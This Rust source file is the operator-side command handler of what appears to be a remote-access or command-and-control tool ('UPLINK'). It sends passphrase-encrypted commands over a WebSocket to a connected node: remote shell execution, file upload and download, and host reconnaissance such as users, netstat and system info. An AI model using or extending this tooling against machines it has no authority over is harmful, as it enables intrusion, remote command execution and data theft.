use std::sync::Arc;
use futures_util::stream::{SplitSink, SplitStream, StreamExt};
use tokio::fs;
use tokio::net::TcpStream;
use tokio::sync::Mutex;
use tokio_tungstenite::tungstenite::Message;
use tokio_tungstenite::WebSocketStream;
use crate::{communication, response_handler};
use crate::command::{Command as NodeCommand, Response};
use indoc::indoc;

pub struct TxCommandHandler {
    passphrase: String,
    ws_sender: Option<Arc<Mutex<SplitSink<WebSocketStream<TcpStream>, Message>>>>,
    ws_receiver: Option<Arc<Mutex<SplitStream<WebSocketStream<TcpStream>>>>>,
}

impl TxCommandHandler {
    pub fn new(
        passphrase: String,
        ws_sender: Option<Arc<Mutex<SplitSink<WebSocketStream<TcpStream>, Message>>>>,
        ws_receiver: Option<Arc<Mutex<SplitStream<WebSocketStream<TcpStream>>>>>,
    ) -> Self {
        TxCommandHandler { passphrase, ws_sender, ws_receiver }
    }

    pub async fn handle_command(&self, command: &str) {
        let command = command.trim();

        if command.is_empty() {
            println!("Empty command received, nothing to execute.");
            return;
        }

        let parts: Vec<&str> = command.split_whitespace().collect();
        let cmd = parts.get(0).unwrap_or(&"");
        let args = &parts[1..].join(" ");

        let node_command = match cmd.to_uppercase().as_str() {
            "H" | "HELP" => {
                let help = indoc!{"
                    [UPLINK HELP]:

                    H - Print help
                    ECHO | PRINT | MSG - Send a message to connected node.

                    GET | DOWNLOAD <remote> <local> - Download a file or directory.
                    PUT | UPLOAD <local> <remote> - Upload a file or directory.
                    LIST | LS | DIR - List files in the directory.

                    SHELL | EXEC | RUN | CMD <command> - Execute a shell command on the connected node.
                    
                    ID | WHOAMI | WHO | W - Get current user
                    PWD | WHERE - Get current directory path
                    USERS - Get users on the system
                    NETSTAT - Get network connections
                    N | NETWORK | IFCONFIG | IPCONFIG - Get network adapter configuration
                    SYSTEM | INFO | SYSTEMINFO | UNAME - Get system configuration

                    PASSPHRASE - Change the encryption passphrase.
                "};
                println!("{}", help);
                return;
            }
            "ECHO" | "PRINT" | "MSG" => NodeCommand::Echo { message: args.to_string() },
            "LIST" | "LS" | "DIR" => NodeCommand::ListFiles,
            "ID" | "WHOAMI" | "WHO" | "W" => NodeCommand::Whoami,
            "PWD" | "WHERE" => NodeCommand::Pwd,
            "USERS"  => NodeCommand::Users,
            "NETSTAT" => NodeCommand::Netstat,
            "N" | "NETWORK" | "IFCONFIG" | "IPCONFIG" => NodeCommand::Network,
            "SYSTEM" | "INFO" | "SYSTEMINFO" | "UNAME" => NodeCommand::Info,
            "GET" | "DOWNLOAD" => { 
                let arg_parts: Vec<&str> = args.splitn(2, ' ').collect();

                if arg_parts.len() < 2 {
                    eprintln!("GET/DOWNLOAD command requires both file path and local path.");
                    return;
                }

                let file_path = arg_parts[0].to_string();
                let file_local_path = arg_parts[1].to_string();

                NodeCommand::GetFile { file_path, file_local_path }
            },
            "PUT" | "UPLOAD" => {
                let arg_parts: Vec<&str> = args.splitn(2, ' ').collect();

                if arg_parts.len() < 2 {
                    eprintln!("PUT/UPLOAD command requires both file path and upload path.");
                    return;
                }

                let file_path = arg_parts[0].to_string();
                let file_up_path = arg_parts[1].to_string();

                let data = fs::read(&file_path).await.unwrap_or_else(|_| vec![]);

                NodeCommand::PutFile { file_path, file_up_path, data }
            }
            "SHELL" | "EXEC" | "RUN" | "CMD" => NodeCommand::Execute { command: args.to_string() },
            "PASSPHRASE" => NodeCommand::ChangePassphrase { new_passphrase: args.to_string() },
            _ => {
                eprintln!("Unknown command: {}", command);
                return;
            }
        };

        tokio::spawn({
            let ws_sender = self.ws_sender.clone();
            let passphrase = self.passphrase.clone();
            async move {
                let serialized_command = serde_json::to_vec(&node_command).expect("Failed to serialize command");
                let encrypted_command = communication::prepare_tx(serialized_command, &passphrase);
                if let Some(ws_sender) = ws_sender {
                    let mut sender = ws_sender.lock().await;
                    communication::send_binary_data(&mut sender, encrypted_command).await;
                }
            }
        });

        tokio::spawn({
            let ws_receiver = self.ws_receiver.clone();
            let passphrase = self.passphrase.clone();
            async move {
                if let Some(ws_receiver) = ws_receiver {
                    while let Some(message) = ws_receiver.lock().await.next().await {
                        match message {
                            Ok(Message::Binary(data)) => {
                                let decrypted_data = communication::prepare_rx(data, &passphrase);
                                let response: Response = serde_json::from_slice(&decrypted_data).expect("Failed to deserialize response");
                                response_handler::process_response(response).await;
                            }
                            Ok(_) => eprintln!("Received unexpected non-binary message"),
                            Err(e) => {
                                eprintln!("Error receiving WebSocket message: {}", e);
                                break;
                            }
                        }
                    }
                }
            }
        });
    }


}
